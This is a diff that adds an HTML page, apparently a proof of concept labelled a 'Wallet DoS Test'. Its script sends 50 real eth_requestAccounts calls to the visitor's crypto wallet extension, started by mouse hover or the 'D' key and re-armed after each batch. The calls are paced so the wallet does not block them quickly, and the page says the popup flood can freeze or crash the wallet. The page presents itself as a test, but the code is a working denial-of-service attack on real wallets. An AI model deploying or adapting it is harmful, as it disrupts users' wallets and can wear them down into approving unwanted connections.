@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Wallet DoS Test</title>
+  <style>
+    body {
+      background: #111;
+      color: #eee;
+      font-family: Inter, system-ui, sans-serif;
+      padding: 32px;
+      text-align: center;
+    }
+    .card {
+      background: #0f1720;
+      border-radius: 12px;
+      padding: 20px;
+      max-width: 900px;
+      margin: 0 auto;
+      box-shadow: 0 6px 20px rgba(0,0,0,0.6);
+    }
+    h1 { margin: 0 0 8px 0; font-size: 20px; color: #f87171; }
+    p { margin: 0 0 12px 0; color: #bfc9d9; }
+    pre {
+      margin-top: 12px;
+      background: #071021;
+      padding: 12px;
+      border-radius: 8px;
+      white-space: pre-wrap;
+      word-break: break-all;
+      max-height: 360px;
+      overflow: auto;
+      color: #e6eef8;
+    }
+    .warn { color: #ffcc00; margin-top: 8px; font-weight: bold; }
+    .good { color: #7ee787; }
+  </style>
+</head>
+<body>
+  <div class="card" id="card">
+    <h1>Wallet Extension DoS Test</h1>
+    <p>Move your cursor over the page to initiate infinite `eth_requestAccounts` popup spam (DoS via popup overload).</p>
+    <p class="warn">Warning: This can crash or freeze your wallet extension. Use mock mode for testing.</p>
+    <p>Press 'D' for manual trigger (trusted gesture).</p>
+    <pre id="output">Ready. Hover your cursor over this page to activate the handler.</pre>
+  </div>
+
+  <script>
+    // CONFIG
+    const REQUEST_COUNT = 50; // Number of consecutive requestAccounts calls
+    const DELAY_MS = 200; // Delay between requests to avoid immediate block
+
+    const outEl = document.getElementById('output');
+
+    function log(...args) {
+      const line = args.map(a => (typeof a === 'string' ? a : JSON.stringify(a))).join(' ');
+      outEl.textContent += line + "\n";
+      outEl.scrollTop = outEl.scrollHeight;
+      console.log(...args);
+    }
+
+    // Mock requestAccounts for testing
+    function mockRequestAccounts(index) {
+      const fakeAccounts = [`0xMOCKADDR_${index}_${Math.random().toString(36).slice(2,10)}`];
+      return Promise.resolve(fakeAccounts);
+    }
+
+    // Attempt real eth_requestAccounts with fallback
+    async function tryRequestAccounts(index) {
+      if (!window.ethereum) {
+        log(`No wallet detected — using mock for #${index}`);
+        return mockRequestAccounts(index);
+      }
+
+      try {
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        return accounts;
+      } catch (err) {
+        log(`Real request #${index} failed: ${err.message || err}. Falling back to mock.`);
+        return mockRequestAccounts(index);
+      }
+    }
+
+    // Batch requestAccounts routine (popup spam DoS)
+    async function requestBatchHover() {
+      document.body.removeEventListener('mouseover', hoverHandler);
+
+      outEl.textContent = '';
+      log('Cursor detected. Starting popup spam DoS...');
+
+      for (let i = 1; i <= REQUEST_COUNT; i++) {
+        log(`Attempting requestAccounts #${i}...`);
+        const accounts = await tryRequestAccounts(i);
+        log(`Result for #${i}: ${JSON.stringify(accounts)}`);
+        await new Promise(resolve => setTimeout(resolve, DELAY_MS)); // Delay biar tidak terlalu cepat block
+      }
+
+      log('DoS attempt completed.');
+      document.body.addEventListener('mouseover', hoverHandler);
+    }
+
+    // Hover handler
+    let hoverTimeout = null;
+    function hoverHandler() {
+      if (hoverTimeout) return;
+      hoverTimeout = setTimeout(() => {
+        hoverTimeout = null;
+        requestBatchHover().catch(err => {
+          log('Error:', err);
+          document.body.addEventListener('mouseover', hoverHandler);
+        });
+      }, 100);
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      document.body.addEventListener('mouseover', hoverHandler);
+      log('Hover listener active. Move cursor to trigger DoS.');
+    });
+
+    // Keyboard trigger for trusted gesture
+    window.addEventListener('keydown', async (e) => {
+      if (e.key.toLowerCase() === 'd') {
+        log('Manual trigger via "D" key!');
+        await requestBatchHover();
+      }
+    });
+  </script>
+</body>
+</html>
